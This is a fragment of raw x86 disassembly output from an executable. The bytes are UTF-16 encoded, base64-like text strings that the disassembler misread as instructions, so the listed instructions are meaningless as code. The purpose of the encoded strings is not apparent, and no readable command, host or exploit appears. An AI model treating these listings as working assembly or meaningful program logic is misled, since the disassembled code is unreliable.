  40a40d:	7a 00                	jp     0x40a40f
  40a40f:	6c                   	insb   (%dx),%es:(%edi)
  40a410:	00 63 00             	add    %ah,0x0(%ebx)
  40a413:	5a                   	pop    %edx
  40a414:	00 32                	add    %dh,(%edx)
  40a416:	00 42 00             	add    %al,0x0(%edx)
  40a419:	43                   	inc    %ebx
  40a41a:	00 58 00             	add    %bl,0x0(%eax)
  40a41d:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40a421:	67 00 3d             	add    %bh,(%di)
  40a424:	00 3d 00 00 92 59    	add    %bh,0x59920000
  40a42a:	56                   	push   %esi
  40a42b:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40a42f:	00 6f 00             	add    %ch,0x0(%edi)
  40a432:	4b                   	dec    %ebx
  40a433:	00 49 00             	add    %cl,0x0(%ecx)
  40a436:	4b                   	dec    %ebx
  40a437:	00 38                	add    %bh,(%eax)
  40a439:	00 56 00             	add    %dl,0x0(%esi)
  40a43c:	59                   	pop    %ecx
  40a43d:	00 41 00             	add    %al,0x0(%ecx)
  40a440:	62 00                	bound  %eax,(%eax)
  40a442:	50                   	push   %eax
  40a443:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40a447:	00 61 00             	add    %ah,0x0(%ecx)
  40a44a:	34 00                	xor    $0x0,%al
  40a44c:	38 00                	cmp    %al,(%eax)
  40a44e:	49                   	dec    %ecx
  40a44f:	00 61 00             	add    %ah,0x0(%ecx)
  40a452:	59                   	pop    %ecx
  40a453:	00 2f                	add    %ch,(%edi)
  40a455:	00 38                	add    %bh,(%eax)
  40a457:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a45b:	00 51 00             	add    %dl,0x0(%ecx)
  40a45e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a462:	52                   	push   %edx
  40a463:	00 68 00             	add    %ch,0x0(%eax)
  40a466:	45                   	inc    %ebp
  40a467:	00 46 00             	add    %al,0x0(%esi)
  40a46a:	56                   	push   %esi
  40a46b:	00 4f 00             	add    %cl,0x0(%edi)
  40a46e:	31 00                	xor    %eax,(%eax)
  40a470:	44                   	inc    %esp
  40a471:	00 30                	add    %dh,(%eax)
  40a473:	00 51 00             	add    %dl,0x0(%ecx)
  40a476:	74 00                	je     0x40a478
  40a478:	56                   	push   %esi
  40a479:	00 61 00             	add    %ah,0x0(%ecx)
  40a47c:	69 00 71 00 4b 00    	imul   $0x4b0071,(%eax),%eax
  40a482:	52                   	push   %edx
  40a483:	00 48 00             	add    %cl,0x0(%eax)
  40a486:	78 00                	js     0x40a488
  40a488:	51                   	push   %ecx
  40a489:	00 68 00             	add    %ch,0x0(%eax)
  40a48c:	49                   	dec    %ecx
  40a48d:	00 76 00             	add    %dh,0x0(%esi)
  40a490:	50                   	push   %eax
  40a491:	00 56 00             	add    %dl,0x0(%esi)
  40a494:	7a 00                	jp     0x40a496
  40a496:	70 00                	jo     0x40a498
  40a498:	79 00                	jns    0x40a49a
  40a49a:	63 00                	arpl   %eax,(%eax)
  40a49c:	46                   	inc    %esi
  40a49d:	00 57 00             	add    %dl,0x0(%edi)
  40a4a0:	6a 00                	push   $0x0
  40a4a2:	31 00                	xor    %eax,(%eax)
  40a4a4:	55                   	push   %ebp
  40a4a5:	00 4e 00             	add    %cl,0x0(%esi)
  40a4a8:	41                   	inc    %ecx
  40a4a9:	00 45 00             	add    %al,0x0(%ebp)
  40a4ac:	30 00                	xor    %al,(%eax)
  40a4ae:	70 00                	jo     0x40a4b0
  40a4b0:	7a 00                	jp     0x40a4b2
  40a4b2:	6b 00 74             	imul   $0x74,(%eax),%eax
  40a4b5:	00 4f 00             	add    %cl,0x0(%edi)
  40a4b8:	77 00                	ja     0x40a4ba
  40a4ba:	2f                   	das
  40a4bb:	00 41 00             	add    %al,0x0(%ecx)
  40a4be:	4c                   	dec    %esp
  40a4bf:	00 78 00             	add    %bh,0x0(%eax)
  40a4c2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4c3:	00 51 00             	add    %dl,0x0(%ecx)
  40a4c6:	41                   	inc    %ecx
  40a4c7:	00 67 00             	add    %ah,0x0(%edi)
  40a4ca:	4b                   	dec    %ebx
  40a4cb:	00 62 00             	add    %ah,0x0(%edx)
  40a4ce:	34 00                	xor    $0x0,%al
  40a4d0:	76 00                	jbe    0x40a4d2
  40a4d2:	54                   	push   %esp
  40a4d3:	00 52 00             	add    %dl,0x0(%edx)
  40a4d6:	68 00 4f 00 62       	push   $0x62004f00
  40a4db:	00 72 00             	add    %dh,0x0(%edx)
  40a4de:	76 00                	jbe    0x40a4e0
  40a4e0:	5a                   	pop    %edx
  40a4e1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4e4:	4b                   	dec    %ebx
  40a4e5:	00 75 00             	add    %dh,0x0(%ebp)
  40a4e8:	46                   	inc    %esi
  40a4e9:	00 79 00             	add    %bh,0x0(%ecx)
  40a4ec:	6c                   	insb   (%dx),%es:(%edi)
  40a4ed:	00 76 00             	add    %dh,0x0(%esi)
  40a4f0:	78 00                	js     0x40a4f2
  40a4f2:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40a4f6:	38 00                	cmp    %al,(%eax)
  40a4f8:	63 00                	arpl   %eax,(%eax)
  40a4fa:	30 00                	xor    %al,(%eax)
  40a4fc:	41                   	inc    %ecx
  40a4fd:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a501:	00 7a 00             	add    %bh,0x0(%edx)
  40a504:	48                   	dec    %eax
  40a505:	00 47 00             	add    %al,0x0(%edi)
  40a508:	75 00                	jne    0x40a50a
  40a50a:	74 00                	je     0x40a50c
  40a50c:	48                   	dec    %eax
  40a50d:	00 61 00             	add    %ah,0x0(%ecx)
  40a510:	42                   	inc    %edx
  40a511:	00 41 00             	add    %al,0x0(%ecx)
  40a514:	6d                   	insl   (%dx),%es:(%edi)
  40a515:	00 4b 00             	add    %cl,0x0(%ebx)
  40a518:	41                   	inc    %ecx
  40a519:	00 47 00             	add    %al,0x0(%edi)
  40a51c:	64 00 74 00 4c       	add    %dh,%fs:0x4c(%eax,%eax,1)
  40a521:	00 77 00             	add    %dh,0x0(%edi)
  40a524:	75 00                	jne    0x40a526
  40a526:	79 00                	jns    0x40a528
  40a528:	68 00 37 00 4f       	push   $0x4f003700
  40a52d:	00 48 00             	add    %cl,0x0(%eax)
  40a530:	77 00                	ja     0x40a532
  40a532:	4b                   	dec    %ebx
  40a533:	00 7a 00             	add    %bh,0x0(%edx)
  40a536:	75 00                	jne    0x40a538
  40a538:	42                   	inc    %edx
  40a539:	00 6d 00             	add    %ch,0x0(%ebp)
  40a53c:	34 00                	xor    $0x0,%al
  40a53e:	61                   	popa
  40a53f:	00 43 00             	add    %al,0x0(%ebx)
  40a542:	6a 00                	push   $0x0
  40a544:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a548:	61                   	popa
  40a549:	00 56 00             	add    %dl,0x0(%esi)
  40a54c:	75 00                	jne    0x40a54e
  40a54e:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a552:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40a556:	4e                   	dec    %esi
  40a557:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a55a:	4d                   	dec    %ebp
  40a55b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a55e:	55                   	push   %ebp
  40a55f:	00 69 00             	add    %ch,0x0(%ecx)
  40a562:	35 00 66 00 33       	xor    $0x33006600,%eax
  40a567:	00 55 00             	add    %dl,0x0(%ebp)
  40a56a:	4e                   	dec    %esi
  40a56b:	00 50 00             	add    %dl,0x0(%eax)
  40a56e:	76 00                	jbe    0x40a570
  40a570:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a574:	50                   	push   %eax
  40a575:	00 61 00             	add    %ah,0x0(%ecx)
  40a578:	6e                   	outsb  %ds:(%esi),(%dx)
  40a579:	00 4f 00             	add    %cl,0x0(%edi)
  40a57c:	72 00                	jb     0x40a57e
  40a57e:	65 00 44 00 70       	add    %al,%gs:0x70(%eax,%eax,1)
  40a583:	00 77 00             	add    %dh,0x0(%edi)
  40a586:	56                   	push   %esi
  40a587:	00 43 00             	add    %al,0x0(%ebx)
  40a58a:	42                   	inc    %edx
  40a58b:	00 4e 00             	add    %cl,0x0(%esi)
  40a58e:	64 00 39             	add    %bh,%fs:(%ecx)
  40a591:	00 46 00             	add    %al,0x0(%esi)
  40a594:	77 00                	ja     0x40a596
  40a596:	45                   	inc    %ebp
  40a597:	00 2b                	add    %ch,(%ebx)
  40a599:	00 2b                	add    %ch,(%ebx)
  40a59b:	00 45 00             	add    %al,0x0(%ebp)
  40a59e:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a5a1:	00 41 00             	add    %al,0x0(%ecx)
  40a5a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5a5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5a8:	63 00                	arpl   %eax,(%eax)
  40a5aa:	55                   	push   %ebp
  40a5ab:	00 78 00             	add    %bh,0x0(%eax)
  40a5ae:	62 00                	bound  %eax,(%eax)
  40a5b0:	78 00                	js     0x40a5b2
  40a5b2:	33 00                	xor    (%eax),%eax
  40a5b4:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40a5b8:	7a 00                	jp     0x40a5ba
  40a5ba:	41                   	inc    %ecx
  40a5bb:	00 65 00             	add    %ah,0x0(%ebp)
  40a5be:	6a 00                	push   $0x0
  40a5c0:	2f                   	das
  40a5c1:	00 2b                	add    %ch,(%ebx)
  40a5c3:	00 42 00             	add    %al,0x0(%edx)
  40a5c6:	43                   	inc    %ebx
  40a5c7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5ca:	50                   	push   %eax
  40a5cb:	00 6a 00             	add    %ch,0x0(%edx)
  40a5ce:	79 00                	jns    0x40a5d0
  40a5d0:	70 00                	jo     0x40a5d2
  40a5d2:	59                   	pop    %ecx
  40a5d3:	00 37                	add    %dh,(%edi)
  40a5d5:	00 45 00             	add    %al,0x0(%ebp)
  40a5d8:	75 00                	jne    0x40a5da
  40a5da:	44                   	inc    %esp
  40a5db:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40a5df:	00 41 00             	add    %al,0x0(%ecx)
  40a5e2:	57                   	push   %edi
  40a5e3:	00 43 00             	add    %al,0x0(%ebx)
  40a5e6:	4f                   	dec    %edi
  40a5e7:	00 47 00             	add    %al,0x0(%edi)
  40a5ea:	4a                   	dec    %edx
  40a5eb:	00 65 00             	add    %ah,0x0(%ebp)
  40a5ee:	50                   	push   %eax
  40a5ef:	00 2f                	add    %ch,(%edi)
  40a5f1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5f4:	78 00                	js     0x40a5f6
  40a5f6:	54                   	push   %esp
  40a5f7:	00 30                	add    %dh,(%eax)
  40a5f9:	00 62 00             	add    %ah,0x0(%edx)
  40a5fc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5fd:	00 41 00             	add    %al,0x0(%ecx)
  40a600:	6d                   	insl   (%dx),%es:(%edi)
  40a601:	00 30                	add    %dh,(%eax)
  40a603:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a606:	7a 00                	jp     0x40a608
  40a608:	31 00                	xor    %eax,(%eax)
  40a60a:	44                   	inc    %esp
  40a60b:	00 52 00             	add    %dl,0x0(%edx)
  40a60e:	79 00                	jns    0x40a610
  40a610:	48                   	dec    %eax
  40a611:	00 79 00             	add    %bh,0x0(%ecx)
  40a614:	61                   	popa
  40a615:	00 66 00             	add    %ah,0x0(%esi)
  40a618:	45                   	inc    %ebp
  40a619:	00 68 00             	add    %ch,0x0(%eax)
  40a61c:	2f                   	das
  40a61d:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40a621:	00 4e 00             	add    %cl,0x0(%esi)
  40a624:	72 00                	jb     0x40a626
  40a626:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40a629:	00 4b 00             	add    %cl,0x0(%ebx)
  40a62c:	52                   	push   %edx
  40a62d:	00 69 00             	add    %ch,0x0(%ecx)
  40a630:	4c                   	dec    %esp
  40a631:	00 59 00             	add    %bl,0x0(%ecx)
  40a634:	75 00                	jne    0x40a636
  40a636:	59                   	pop    %ecx
  40a637:	00 57 00             	add    %dl,0x0(%edi)
  40a63a:	55                   	push   %ebp
  40a63b:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40a63f:	00 5a 00             	add    %bl,0x0(%edx)
  40a642:	78 00                	js     0x40a644
  40a644:	77 00                	ja     0x40a646
  40a646:	48                   	dec    %eax
  40a647:	00 6e 00             	add    %ch,0x0(%esi)
  40a64a:	6d                   	insl   (%dx),%es:(%edi)
  40a64b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a64e:	6a 00                	push   $0x0
  40a650:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a654:	6e                   	outsb  %ds:(%esi),(%dx)
  40a655:	00 4e 00             	add    %cl,0x0(%esi)
  40a658:	57                   	push   %edi
  40a659:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40a65d:	00 35 00 36 00 57    	add    %dh,0x57003600
  40a663:	00 4a 00             	add    %cl,0x0(%edx)
  40a666:	37                   	aaa
  40a667:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a66b:	00 49 00             	add    %cl,0x0(%ecx)
  40a66e:	56                   	push   %esi
  40a66f:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40a673:	00 6b 00             	add    %ch,0x0(%ebx)
  40a676:	5a                   	pop    %edx
  40a677:	00 4e 00             	add    %cl,0x0(%esi)
  40a67a:	6c                   	insb   (%dx),%es:(%edi)
  40a67b:	00 31                	add    %dh,(%ecx)
  40a67d:	00 62 00             	add    %ah,0x0(%edx)
  40a680:	32 00                	xor    (%eax),%al
  40a682:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40a686:	51                   	push   %ecx
  40a687:	00 57 00             	add    %dl,0x0(%edi)
  40a68a:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40a68e:	5a                   	pop    %edx
  40a68f:	00 43 00             	add    %al,0x0(%ebx)
  40a692:	50                   	push   %eax
  40a693:	00 4b 00             	add    %cl,0x0(%ebx)
  40a696:	75 00                	jne    0x40a698
  40a698:	51                   	push   %ecx
  40a699:	00 6f 00             	add    %ch,0x0(%edi)
  40a69c:	45                   	inc    %ebp
  40a69d:	00 41 00             	add    %al,0x0(%ecx)
  40a6a0:	63 00                	arpl   %eax,(%eax)
  40a6a2:	77 00                	ja     0x40a6a4
  40a6a4:	45                   	inc    %ebp
  40a6a5:	00 57 00             	add    %dl,0x0(%edi)
  40a6a8:	42                   	inc    %edx
  40a6a9:	00 59 00             	add    %bl,0x0(%ecx)
  40a6ac:	37                   	aaa
  40a6ad:	00 70 00             	add    %dh,0x0(%eax)
  40a6b0:	4f                   	dec    %edi
  40a6b1:	00 6e 00             	add    %ch,0x0(%esi)
  40a6b4:	35 00 2f 00 74       	xor    $0x74002f00,%eax
  40a6b9:	00 6f 00             	add    %ch,0x0(%edi)
  40a6bc:	62 00                	bound  %eax,(%eax)
  40a6be:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40a6c2:	4f                   	dec    %edi
  40a6c3:	00 49 00             	add    %cl,0x0(%ecx)
  40a6c6:	68 00 46 00 52       	push   $0x52004600
  40a6cb:	00 58 00             	add    %bl,0x0(%eax)
  40a6ce:	74 00                	je     0x40a6d0
  40a6d0:	5a                   	pop    %edx
  40a6d1:	00 72 00             	add    %dh,0x0(%edx)
  40a6d4:	49                   	dec    %ecx
  40a6d5:	00 38                	add    %bh,(%eax)
  40a6d7:	00 76 00             	add    %dh,0x0(%esi)
  40a6da:	53                   	push   %ebx
  40a6db:	00 4f 00             	add    %cl,0x0(%edi)
  40a6de:	31 00                	xor    %eax,(%eax)
  40a6e0:	45                   	inc    %ebp
  40a6e1:	00 7a 00             	add    %bh,0x0(%edx)
  40a6e4:	6a 00                	push   $0x0
  40a6e6:	46                   	inc    %esi
  40a6e7:	00 68 00             	add    %ch,0x0(%eax)
  40a6ea:	38 00                	cmp    %al,(%eax)
  40a6ec:	61                   	popa
  40a6ed:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  40a6f1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a6f4:	78 00                	js     0x40a6f6
  40a6f6:	46                   	inc    %esi
  40a6f7:	00 38                	add    %bh,(%eax)
  40a6f9:	00 31                	add    %dh,(%ecx)
  40a6fb:	00 52 00             	add    %dl,0x0(%edx)
  40a6fe:	6c                   	insb   (%dx),%es:(%edi)
  40a6ff:	00 4f 00             	add    %cl,0x0(%edi)
  40a702:	30 00                	xor    %al,(%eax)
  40a704:	55                   	push   %ebp
  40a705:	00 66 00             	add    %ah,0x0(%esi)
  40a708:	59                   	pop    %ecx
  40a709:	00 7a 00             	add    %bh,0x0(%edx)
  40a70c:	71 00                	jno    0x40a70e
  40a70e:	61                   	popa
  40a70f:	00 53 00             	add    %dl,0x0(%ebx)
  40a712:	44                   	inc    %esp
  40a713:	00 4a 00             	add    %cl,0x0(%edx)
  40a716:	45                   	inc    %ebp
  40a717:	00 69 00             	add    %ch,0x0(%ecx)
  40a71a:	75 00                	jne    0x40a71c
  40a71c:	74 00                	je     0x40a71e
  40a71e:	69 00 68 00 47 00    	imul   $0x470068,(%eax),%eax
  40a724:	4a                   	dec    %edx
  40a725:	00 69 00             	add    %ch,0x0(%ecx)
  40a728:	48                   	dec    %eax
  40a729:	00 51 00             	add    %dl,0x0(%ecx)
  40a72c:	4d                   	dec    %ebp
  40a72d:	00 6f 00             	add    %ch,0x0(%edi)
  40a730:	69 00 32 00 35 00    	imul   $0x350032,(%eax),%eax
  40a736:	6c                   	insb   (%dx),%es:(%edi)
  40a737:	00 4f 00             	add    %cl,0x0(%edi)
  40a73a:	56                   	push   %esi
  40a73b:	00 51 00             	add    %dl,0x0(%ecx)
  40a73e:	47                   	inc    %edi
  40a73f:	00 50 00             	add    %dl,0x0(%eax)
  40a742:	6d                   	insl   (%dx),%es:(%edi)
  40a743:	00 6f 00             	add    %ch,0x0(%edi)
  40a746:	39 00                	cmp    %eax,(%eax)
  40a748:	50                   	push   %eax
  40a749:	00 52 00             	add    %dl,0x0(%edx)
  40a74c:	35 00 4d 00 57       	xor    $0x57004d00,%eax
  40a751:	00 78 00             	add    %bh,0x0(%eax)
  40a754:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40a758:	54                   	push   %esp
  40a759:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40a75d:	00 49 00             	add    %cl,0x0(%ecx)
  40a760:	2f                   	das
  40a761:	00 41 00             	add    %al,0x0(%ecx)
  40a764:	6f                   	outsl  %ds:(%esi),(%dx)
  40a765:	00 36                	add    %dh,(%esi)
  40a767:	00 78 00             	add    %bh,0x0(%eax)
  40a76a:	62 00                	bound  %eax,(%eax)
  40a76c:	31 00                	xor    %eax,(%eax)
  40a76e:	34 00                	xor    $0x0,%al
  40a770:	58                   	pop    %eax
  40a771:	00 6d 00             	add    %ch,0x0(%ebp)
  40a774:	47                   	inc    %edi
  40a775:	00 41 00             	add    %al,0x0(%ecx)
  40a778:	5a                   	pop    %edx
  40a779:	00 35 00 43 00 70    	add    %dh,0x70004300
  40a77f:	00 39                	add    %bh,(%ecx)
  40a781:	00 63 00             	add    %ah,0x0(%ebx)
  40a784:	58                   	pop    %eax
  40a785:	00 55 00             	add    %dl,0x0(%ebp)
  40a788:	51                   	push   %ecx
  40a789:	00 68 00             	add    %ch,0x0(%eax)
  40a78c:	48                   	dec    %eax
  40a78d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a790:	71 00                	jno    0x40a792
  40a792:	4d                   	dec    %ebp
  40a793:	00 37                	add    %dh,(%edi)
  40a795:	00 7a 00             	add    %bh,0x0(%edx)
  40a798:	4d                   	dec    %ebp
  40a799:	00 38                	add    %bh,(%eax)
  40a79b:	00 31                	add    %dh,(%ecx)
  40a79d:	00 39                	add    %bh,(%ecx)
  40a79f:	00 52 00             	add    %dl,0x0(%edx)
  40a7a2:	2f                   	das
  40a7a3:	00 70 00             	add    %dh,0x0(%eax)
  40a7a6:	50                   	push   %eax
  40a7a7:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40a7ab:	00 56 00             	add    %dl,0x0(%esi)
  40a7ae:	45                   	inc    %ebp
  40a7af:	00 32                	add    %dh,(%edx)
  40a7b1:	00 55 00             	add    %dl,0x0(%ebp)
  40a7b4:	37                   	aaa
  40a7b5:	00 47 00             	add    %al,0x0(%edi)
  40a7b8:	53                   	push   %ebx
  40a7b9:	00 79 00             	add    %bh,0x0(%ecx)
  40a7bc:	44                   	inc    %esp
  40a7bd:	00 77 00             	add    %dh,0x0(%edi)
  40a7c0:	58                   	pop    %eax
  40a7c1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7c4:	32 00                	xor    (%eax),%al
  40a7c6:	6c                   	insb   (%dx),%es:(%edi)
  40a7c7:	00 5a 00             	add    %bl,0x0(%edx)
  40a7ca:	34 00                	xor    $0x0,%al
  40a7cc:	55                   	push   %ebp
  40a7cd:	00 73 00             	add    %dh,0x0(%ebx)
  40a7d0:	2f                   	das
  40a7d1:	00 58 00             	add    %bl,0x0(%eax)
  40a7d4:	45                   	inc    %ebp
  40a7d5:	00 79 00             	add    %bh,0x0(%ecx)
  40a7d8:	4b                   	dec    %ebx
  40a7d9:	00 47 00             	add    %al,0x0(%edi)
  40a7dc:	69 00 6a 00 72 00    	imul   $0x72006a,(%eax),%eax
  40a7e2:	71 00                	jno    0x40a7e4
  40a7e4:	37                   	aaa
  40a7e5:	00 39                	add    %bh,(%ecx)
  40a7e7:	00 79 00             	add    %bh,0x0(%ecx)
  40a7ea:	65 00 30             	add    %dh,%gs:(%eax)
  40a7ed:	00 4a 00             	add    %cl,0x0(%edx)
  40a7f0:	56                   	push   %esi
  40a7f1:	00 48 00             	add    %cl,0x0(%eax)
  40a7f4:	44                   	inc    %esp
  40a7f5:	00 31                	add    %dh,(%ecx)
  40a7f7:	00 35 00 65 00 4c    	add    %dh,0x4c006500
  40a7fd:	00 38                	add    %bh,(%eax)
  40a7ff:	00 32                	add    %dh,(%edx)
  40a801:	00 73 00             	add    %dh,0x0(%ebx)
  40a804:	45                   	inc    %ebp
  40a805:	00 30                	add    %dh,(%eax)
  40a807:	00 32                	add    %dh,(%edx)
  40a809:	00 2f                	add    %ch,(%edi)
  40a80b:	00 52 00             	add    %dl,0x0(%edx)
  40a80e:	66 00 37             	data16 add %dh,(%edi)
  40a811:	00 52 00             	add    %dl,0x0(%edx)
  40a814:	4a                   	dec    %edx
  40a815:	00 59 00             	add    %bl,0x0(%ecx)
  40a818:	34 00                	xor    $0x0,%al
  40a81a:	74 00                	je     0x40a81c
  40a81c:	5a                   	pop    %edx
  40a81d:	00 4a 00             	add    %cl,0x0(%edx)
  40a820:	53                   	push   %ebx
  40a821:	00 31                	add    %dh,(%ecx)
  40a823:	00 56 00             	add    %dl,0x0(%esi)
  40a826:	31 00                	xor    %eax,(%eax)
  40a828:	76 00                	jbe    0x40a82a
  40a82a:	2b 00                	sub    (%eax),%eax
  40a82c:	48                   	dec    %eax
  40a82d:	00 30                	add    %dh,(%eax)
  40a82f:	00 38                	add    %bh,(%eax)
  40a831:	00 36                	add    %dh,(%esi)
  40a833:	00 77 00             	add    %dh,0x0(%edi)
  40a836:	41                   	inc    %ecx
  40a837:	00 6e 00             	add    %ch,0x0(%esi)
  40a83a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a83b:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40a83f:	00 73 00             	add    %dh,0x0(%ebx)
  40a842:	51                   	push   %ecx
  40a843:	00 68 00             	add    %ch,0x0(%eax)
  40a846:	77 00                	ja     0x40a848
  40a848:	59                   	pop    %ecx
  40a849:	00 4e 00             	add    %cl,0x0(%esi)
  40a84c:	57                   	push   %edi
  40a84d:	00 58 00             	add    %bl,0x0(%eax)
  40a850:	34 00                	xor    $0x0,%al
  40a852:	7a 00                	jp     0x40a854
  40a854:	69 00 55 00 37 00    	imul   $0x370055,(%eax),%eax
  40a85a:	57                   	push   %edi
  40a85b:	00 46 00             	add    %al,0x0(%esi)
  40a85e:	73 00                	jae    0x40a860
  40a860:	33 00                	xor    (%eax),%eax
  40a862:	58                   	pop    %eax
  40a863:	00 47 00             	add    %al,0x0(%edi)
  40a866:	32 00                	xor    (%eax),%al
  40a868:	45                   	inc    %ebp
  40a869:	00 30                	add    %dh,(%eax)
  40a86b:	00 72 00             	add    %dh,0x0(%edx)
  40a86e:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a872:	33 00                	xor    (%eax),%eax
  40a874:	52                   	push   %edx
  40a875:	00 4b 00             	add    %cl,0x0(%ebx)
  40a878:	51                   	push   %ecx
  40a879:	00 61 00             	add    %ah,0x0(%ecx)
  40a87c:	46                   	inc    %esi
  40a87d:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40a881:	00 2f                	add    %ch,(%edi)
  40a883:	00 45 00             	add    %al,0x0(%ebp)
  40a886:	51                   	push   %ecx
  40a887:	00 7a 00             	add    %bh,0x0(%edx)
  40a88a:	7a 00                	jp     0x40a88c
  40a88c:	59                   	pop    %ecx
  40a88d:	00 5a 00             	add    %bl,0x0(%edx)
  40a890:	46                   	inc    %esi
  40a891:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40a895:	00 6d 00             	add    %ch,0x0(%ebp)
  40a898:	68 00 53 00 64       	push   $0x64005300
  40a89d:	00 72 00             	add    %dh,0x0(%edx)
  40a8a0:	46                   	inc    %esi
  40a8a1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8a4:	71 00                	jno    0x40a8a6
  40a8a6:	4f                   	dec    %edi
  40a8a7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8aa:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8ab:	00 73 00             	add    %dh,0x0(%ebx)
  40a8ae:	76 00                	jbe    0x40a8b0
  40a8b0:	42                   	inc    %edx
  40a8b1:	00 6f 00             	add    %ch,0x0(%edi)
  40a8b4:	5a                   	pop    %edx
  40a8b5:	00 68 00             	add    %ch,0x0(%eax)
  40a8b8:	43                   	inc    %ebx
  40a8b9:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40a8bd:	00 36                	add    %dh,(%esi)
  40a8bf:	00 6e 00             	add    %ch,0x0(%esi)
  40a8c2:	69 00 36 00 4a 00    	imul   $0x4a0036,(%eax),%eax
  40a8c8:	75 00                	jne    0x40a8ca
  40a8ca:	6b 00 74             	imul   $0x74,(%eax),%eax
  40a8cd:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40a8d1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8d4:	70 00                	jo     0x40a8d6
  40a8d6:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a8da:	62 00                	bound  %eax,(%eax)
  40a8dc:	56                   	push   %esi
  40a8dd:	00 41 00             	add    %al,0x0(%ecx)
  40a8e0:	44                   	inc    %esp
  40a8e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a8e4:	32 00                	xor    (%eax),%al
  40a8e6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8e7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8ea:	58                   	pop    %eax
  40a8eb:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40a8ef:	00 2f                	add    %ch,(%edi)
  40a8f1:	00 59 00             	add    %bl,0x0(%ecx)
  40a8f4:	78 00                	js     0x40a8f6
  40a8f6:	63 00                	arpl   %eax,(%eax)
  40a8f8:	38 00                	cmp    %al,(%eax)
  40a8fa:	75 00                	jne    0x40a8fc
  40a8fc:	30 00                	xor    %al,(%eax)
  40a8fe:	37                   	aaa
  40a8ff:	00 49 00             	add    %cl,0x0(%ecx)
  40a902:	4f                   	dec    %edi
  40a903:	00 43 00             	add    %al,0x0(%ebx)
  40a906:	56                   	push   %esi
  40a907:	00 46 00             	add    %al,0x0(%esi)
  40a90a:	46                   	inc    %esi
  40a90b:	00 79 00             	add    %bh,0x0(%ecx)
  40a90e:	39 00                	cmp    %eax,(%eax)
  40a910:	6d                   	insl   (%dx),%es:(%edi)
  40a911:	00 7a 00             	add    %bh,0x0(%edx)
  40a914:	4b                   	dec    %ebx
  40a915:	00 4e 00             	add    %cl,0x0(%esi)
  40a918:	44                   	inc    %esp
  40a919:	00 53 00             	add    %dl,0x0(%ebx)
  40a91c:	34 00                	xor    $0x0,%al
  40a91e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a91f:	00 7a 00             	add    %bh,0x0(%edx)
  40a922:	6f                   	outsl  %ds:(%esi),(%dx)
  40a923:	00 42 00             	add    %al,0x0(%edx)
  40a926:	6f                   	outsl  %ds:(%esi),(%dx)
  40a927:	00 68 00             	add    %ch,0x0(%eax)
  40a92a:	37                   	aaa
  40a92b:	00 37                	add    %dh,(%edi)
  40a92d:	00 77 00             	add    %dh,0x0(%edi)
  40a930:	47                   	inc    %edi
  40a931:	00 4f 00             	add    %cl,0x0(%edi)
  40a934:	71 00                	jno    0x40a936
  40a936:	55                   	push   %ebp
  40a937:	00 35 00 31 00 54    	add    %dh,0x54003100
  40a93d:	00 62 00             	add    %ah,0x0(%edx)
  40a940:	47                   	inc    %edi
  40a941:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40a945:	00 39                	add    %bh,(%ecx)
  40a947:	00 48 00             	add    %cl,0x0(%eax)
  40a94a:	45                   	inc    %ebp
